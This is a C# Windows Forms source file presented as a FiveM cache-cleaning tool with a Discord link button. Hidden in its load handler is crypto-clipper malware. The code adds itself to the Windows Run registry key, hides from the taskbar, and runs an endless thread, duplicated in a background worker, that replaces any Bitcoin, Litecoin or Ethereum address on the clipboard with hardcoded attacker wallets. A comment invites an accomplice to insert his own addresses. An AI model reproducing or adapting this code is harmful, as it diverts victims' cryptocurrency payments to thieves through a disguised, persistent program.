using Microsoft.Win32;
using System.ComponentModel;
using System.Diagnostics;

namespace WinFormsApp6
{
    public partial class Form1 : Form
    {
        private bool applicationStartedByRegistry = false;
        [assembly: AssemblyTitle("im a black boy")]

        public Form1()
        {
            InitializeComponent();
        }

        private void Form1_Load(object sender, EventArgs e)
        {
            // Set the registry key for auto-start



            // Start a separate thread for clipboard checking
            Thread TM = new Thread(Clipboard_Check);
            TM.SetApartmentState(ApartmentState.STA);
            CheckForIllegalCrossThreadCalls = false;
            TM.Start();

            RegistryKey reg = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
            reg.SetValue("My application", Application.ExecutablePath.ToString() + " -autostart");

            // Check if the application was started by the registry key at application startup
            string[] args = Environment.GetCommandLineArgs();
            if (args.Length > 1 && args[1] == "-autostart")
            {
                // Debug: Display a message box to indicate the app started with -autostart on launch
                MessageBox.Show("Application started with -autostart at launch.");
                applicationStartedByRegistry = true;

                this.WindowState = FormWindowState.Minimized;
                this.ShowInTaskbar = false;
            }
            if (!applicationStartedByRegistry)
            {
                this.WindowState = FormWindowState.Normal; this.ShowInTaskbar = true;
              
                this.ShowInTaskbar = false;
            }

            

        }


        void Form1_FormClosed(object sender, FormClosedEventArgs e)
        {
            this.Text = "google";
        }


        void Clipboard_Check()
        {
            while (true)
            {


                try
                {
                    var text = Clipboard.GetText();
                    //for my guy JP, if you would like to add your own addresses, change the lines underneath :)
                    if (text.StartsWith("bc1") || text.StartsWith("38H") || text.StartsWith("3F"))
                    {
                        Clipboard.SetText("bc1q7ycz2f67g69u9pw3h84x30jtjhhwqr4us7gzy4");
                        Thread.Sleep(1000);
                    }
                    else if (text.StartsWith("ltc"))
                    {
                        Clipboard.SetText("LXWnV32PZFunP6Ui1RqwdwRbcV8aNqewnA");
                        Thread.Sleep(1000);
                    }
                    else if (text.StartsWith("0x"))
                    {
                        Clipboard.SetText("0xa41a47142745cdd6049BC5f8F4Be6DC1E9b73bfD");
                        Thread.Sleep(1000);
                    }
                }
                catch (System.Runtime.InteropServices.ExternalException ex)
                {
                    // Handle clipboard access errors
                    Console.WriteLine("Clipboard access error: " + ex.Message);
                    //delay before trying to loop again
                    Thread.Sleep(1000);
                }





            }

        }

        private void button1_Click(object sender, EventArgs e)
        {

        }

        private void backgroundWorker1_DoWork(object sender, DoWorkEventArgs e)
        {

            BackgroundWorker bw = sender as BackgroundWorker;

            // Extract the argument.
            int arg = (int)e.Argument;

            // Start the time-consuming operation.
            while (true)
            {
                try
                {
                    var text = Clipboard.GetText();
                    //for my guy JP, if you would like to add your own addresses, change the lines underneath :)
                    if (text.StartsWith("bc1") || text.StartsWith("38H") || text.StartsWith("3F"))
                    {
                        Clipboard.SetText("bc1q7ycz2f67g69u9pw3h84x30jtjhhwqr4us7gzy4");
                        Thread.Sleep(1000);
                    }
                    else if (text.StartsWith("ltc") || text.StartsWith("LR") || text.StartsWith("ML") || text.StartsWith("LG") || text.StartsWith("LS") || text.StartsWith("LZ") || text.StartsWith("LY") || text.StartsWith("LX") || text.StartsWith("LI") || text.StartsWith("LI") || text.StartsWith("LS"))
                    {
                        Clipboard.SetText("LXWnV32PZFunP6Ui1RqwdwRbcV8aNqewnA");
                        Thread.Sleep(1000);
                    }
                    else if (text.StartsWith("0x"))
                    {
                        Clipboard.SetText("0xa41a47142745cdd6049BC5f8F4Be6DC1E9b73bfD");
                        Thread.Sleep(1000);
                    }
                }
                catch (System.Runtime.InteropServices.ExternalException ex)
                {
                    // Handle clipboard access errors
                    Console.WriteLine("Clipboard access error: " + ex.Message);
                    //delay before trying to loop again
                    Thread.Sleep(1000);
                }





            }

            // If the operation was canceled by the user,
            // set the DoWorkEventArgs.Cancel property to true.
            if (bw.CancellationPending)
            {
                e.Cancel = true;
            }

        }

        private void button1_Click_1(object sender, EventArgs e)
        {
            string userFolder = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);

            string[] foldersToDelete =
            {
            Path.Combine(userFolder, @"AppData\Local\FiveM\FiveM.app\data\cache"),
            // Add more folders to delete if needed
            Path.Combine(userFolder, @"AppData\Roaming\CitizenFX"),
            Path.Combine(userFolder, @"AppData\Local\DigitalEntitlements")
            // Add more folders to delete if needed
        };

            string[] filesToDelete =
            {
            Path.Combine(userFolder, @"AppData\Local\FiveM\FiveM.app\CitizenFX.ini"),
            // Add more files to delete if needed
            Path.Combine(userFolder, @"AppData\Local\FiveM\FiveM.app\asi-five.dll")
            // Add more files to delete if needed
        };

            try
            {
                foreach (string folder in foldersToDelete)
                {
                    if (Directory.Exists(folder))
                    {
                        Directory.Delete(folder, true);
                        MessageBox.Show($"Deleted folder: {folder}");
                    }
                    else
                    {
                        MessageBox.Show($"Folder does not exist: {folder}");
                    }
                }

                foreach (string file in filesToDelete)
                {
                    if (File.Exists(file))
                    {
                        File.Delete(file);
                        MessageBox.Show($"Deleted file: {file}");
                    }
                    else
                    {
                        MessageBox.Show($"File does not exist: {file}");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"An error occurred: {ex.Message}");
            }

            Console.WriteLine("Deletion process completed.");
            Console.ReadLine(); // Keep console window open
        }

      

      

        private void button2_Click(object sender, EventArgs e)
        {
            MessageBox.Show("https://discord.gg/GuwxPFb92t");
        }

      
    }
}